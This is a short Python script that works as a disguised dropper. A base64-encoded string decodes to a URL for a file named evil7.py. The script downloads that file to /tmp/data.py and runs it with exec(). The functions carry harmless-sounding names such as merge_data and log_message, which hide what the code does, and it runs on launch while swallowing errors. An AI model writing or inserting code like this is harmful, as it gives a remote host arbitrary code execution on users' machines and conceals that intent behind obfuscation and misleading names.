import urllib.request
import base64

def merge_data(a):
    return base64.b64decode(a).decode("utf-8")

def split_data(b, c):
    urllib.request.urlretrieve(b, c)

def log_message(c):
    with open(c, "r") as f:
        d = f.read()
    exec(d)

def main():
    try:
        a = "aHR0cDovL3NhbXBsZS51cmwvZXZpbDcucHk="
        b = merge_data(a)
        c = "/tmp/data.py"
        split_data(b, c)
        log_message(c)
    except Exception as e:
        print(e)

main()
